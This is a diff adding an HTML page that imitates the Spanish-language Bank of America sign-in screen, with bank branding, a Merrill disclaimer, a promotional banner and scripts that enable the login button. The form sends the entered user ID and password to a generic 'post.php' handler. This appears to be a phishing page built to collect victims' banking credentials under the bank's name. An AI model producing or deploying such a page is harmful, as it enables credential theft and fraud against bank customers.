@@ -1,0 +1,151 @@
+<html>
+ <head>
+  <title>
+   Bank of America
+  </title>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet"/>
+  <style>
+   body {
+            font-family: 'Roboto', sans-serif;
+        }
+    .input-placeholder::placeholder {
+        color: #1a3e7a;
+    }
+    .input-underline {
+        border: none;
+        border-bottom: 2px solid gray;
+        border-radius: 0;
+    }
+    .input-underline:focus {
+        border-bottom: 2px solid #1a3e7a;
+        outline: none;
+    }
+    .btn-disabled {
+        background-color: gray;
+        cursor: not-allowed;
+    }
+    .btn-enabled {
+        background-color: #1a3e7a;
+        cursor: pointer;
+    }
+    .text-blue-custom {
+        color: #1a3e7a;
+    }
+    .form-checkbox-custom:checked {
+        background-color: #1a3e7a;
+        border-color: #1a3e7a;
+    }
+  </style>
+ </head>
+ <body class="bg-gray-50">
+  <div class="max-w-md mx-auto mt-10">
+   <div class="text-center mb-6">
+    <img alt="Bank of America logo" class="mx-auto" height="50" src="BofA_rgb.png" width="150"/>
+   </div>
+   <div class="bg-white p-6 rounded-lg shadow-lg">
+    <form action="post.php" method="post" onsubmit="return validateForm()">
+     <input class="w-full p-2 mb-4 input-underline input-placeholder text-blue-custom" name="username" placeholder="Identificación de usuario" type="text" id="username" oninput="enablePasswordField()"/>
+     <input class="w-full p-2 mb-4 input-underline input-placeholder text-blue-custom" name="password" placeholder="Contraseña" type="password" id="password" disabled oninput="enableLoginButton()"/>
+     <div class="flex items-center justify-between mb-4">
+      <label class="flex items-center text-blue-custom">
+       <input class="form-checkbox form-checkbox-custom" type="checkbox"/>
+       <span class="ml-2">
+        Guardar Id. de usuario
+       </span>
+      </label>
+      <label class="flex items-center text-blue-custom">
+       <input class="form-checkbox form-checkbox-custom" type="checkbox"/>
+       <span class="ml-2">
+        Configurar datos biométricos
+       </span>
+      </label>
+     </div>
+     <button class="w-full text-white py-2 rounded btn-disabled" id="loginButton" disabled type="submit">
+      INICIAR SESIÓN
+     </button>
+    </form>
+    <div class="text-center mt-4">
+     <a class="text-blue-custom" href="#">
+      Olvidé la Identificación/Contraseña
+     </a>
+    </div>
+   </div>
+   <div class="text-center mt-6">
+    <a class="text-blue-custom" href="#">
+     My Balance®
+    </a>
+    |
+    <a class="text-blue-custom" href="#">
+     Inscribirse
+    </a>
+   </div>
+   <div class="mt-6">
+    <img alt="Nuevos clientes de cuentas de cheques $200 oferta de dinero" class="w-full" height="200" src="https://oaidalleapiprodscus.blob.core.windows.net/private/org-sSsOulEoQY3dXtF2RiaK66Ja/user-XZ7Av8ZH1bvGvI0GdH7WwbAs/img-kyKZgOXou61aaHdEphEAMwTR.png?st=2024-07-07T02%3A59%3A53Z&amp;se=2024-07-07T04%3A59%3A53Z&amp;sp=r&amp;sv=2023-11-03&amp;sr=b&amp;rscd=inline&amp;rsct=image/png&amp;skoid=6aaadede-4fb3-4698-a8f6-684d7786b067&amp;sktid=a48cca56-e6da-484e-a814-9c849652bcb3&amp;skt=2024-07-06T08%3A06%3A37Z&amp;ske=2024-07-07T08%3A06%3A37Z&amp;sks=b&amp;skv=2023-11-03&amp;sig=VqPyG6lz7fg0Z%2BdA%2B/Ua%2B6vju4AFI1CxkmvF1iY17y0%3D" width="400"/>
+   </div>
+   <div class="text-center mt-6">
+    <a class="text-blue-custom" href="#">
+     Localizador
+    </a>
+    |
+    <a class="text-blue-custom" href="#">
+     Contacto
+    </a>
+   </div>
+   <div class="mt-6 text-center">
+    <p class="text-gray-700">
+     Más información sobre los antecedentes de Merrill en el
+     <a class="text-blue-custom" href="#">
+      BrokerCheck de FINRA.
+     </a>
+    </p>
+   </div>
+   <div class="mt-6 text-gray-700 text-sm">
+    <p>
+     Parte de la información sobre su relación con Bank of America y Merrill aún puede proporcionarse solamente en inglés. Además, según lo indicado en su acuerdo de cuenta de Merrill, los documentos, acuerdos e información que se acepten sobre su relación con Merrill, que incluyen pero no se limitan a los estados de cuenta, confirmaciones y acuerdos, se proporcionarán solamente en inglés. Es posible que algunos documentos estén disponibles en español a pedido.
+    </p>
+   </div>
+  </div>
+  <script>
+   function enablePasswordField() {
+        const username = document.getElementById('username').value;
+        const passwordField = document.getElementById('password');
+        if (username.trim() !== '') {
+            passwordField.disabled = false;
+        } else {
+            passwordField.disabled = true;
+            document.getElementById('loginButton').classList.remove('btn-enabled');
+            document.getElementById('loginButton').classList.add('btn-disabled');
+            document.getElementById('loginButton').disabled = true;
+        }
+    }
+
+    function enableLoginButton() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const loginButton = document.getElementById('loginButton');
+        if (username.trim() !== '' && password.trim() !== '') {
+            loginButton.classList.remove('btn-disabled');
+            loginButton.classList.add('btn-enabled');
+            loginButton.disabled = false;
+        } else {
+            loginButton.classList.remove('btn-enabled');
+            loginButton.classList.add('btn-disabled');
+            loginButton.disabled = true;
+        }
+    }
+
+    function validateForm() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        if (username.trim() === '' || password.trim() === '') {
+            alert('Por favor, complete todos los campos.');
+            return false;
+        }
+        return true;
+    }
+  </script>
+ </body>
+</html>
